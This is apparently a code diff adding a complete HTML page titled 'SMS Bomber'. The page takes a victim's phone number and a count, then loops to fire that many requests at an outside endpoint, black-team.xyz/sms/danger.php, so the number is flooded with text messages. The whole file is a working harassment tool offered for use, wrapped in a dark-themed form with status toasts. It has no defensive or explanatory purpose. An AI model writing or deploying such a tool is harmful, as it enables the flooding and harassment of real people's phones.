@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Bomber</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background-color: #333;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        input[type="text"], input[type="number"] {
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            width: 80%;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #ff0000;
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #cc0000;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>SMS Bomber</h1>
+        <input type="text" id="phone" placeholder="Enter Phone Number" required>
+        <input type="number" id="limit" placeholder="Enter Limit" required>
+        <button onclick="sendSMS()">Send SMS</button>
+    </div>
+
+    <script>
+        function sendSMS() {
+            const phone = document.getElementById('phone').value;
+            const limit = document.getElementById('limit').value;
+
+            showSendingToast(); // Show "Message Sending" toast
+
+            for (let i = 0; i < limit; i++) {
+                fetch(`https://black-team.xyz/sms/danger.php?phone=${phone}`)
+                    .then(response => {
+                        if (response.ok) {
+                            showToast('Message sent successfully!');
+                        } else {
+                            showToast('Failed to send message.');
+                        }
+                    });
+            }
+        }
+
+        function showToast(message) {
+            const toast = document.createElement('div');
+            toast.innerText = message;
+            toast.style.position = 'fixed';
+            toast.style.bottom = '20px';
+            toast.style.left = '50%';
+            toast.style.transform = 'translateX(-50%)';
+            toast.style.backgroundColor = '#444';
+            toast.style.color = '#fff';
+            toast.style.padding = '10px';
+            toast.style.borderRadius = '5px';
+            document.body.appendChild(toast);
+            setTimeout(() => {
+                document.body.removeChild(toast);
+            }, 3000);
+        }
+
+        function showSendingToast() {
+            const sendingToast = document.createElement('div');
+            sendingToast.innerText = 'Message Sending';
+            sendingToast.style.position = 'fixed';
+            sendingToast.style.bottom = '60px';
+            sendingToast.style.left = '50%';
+            sendingToast.style.transform = 'translateX(-50%)';
+            sendingToast.style.backgroundColor = '#555';
+            sendingToast.style.color = '#fff';
+            sendingToast.style.padding = '10px';
+            sendingToast.style.borderRadius = '5px';
+            document.body.appendChild(sendingToast);
+            setTimeout(() => {
+                document.body.removeChild(sendingToast);
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
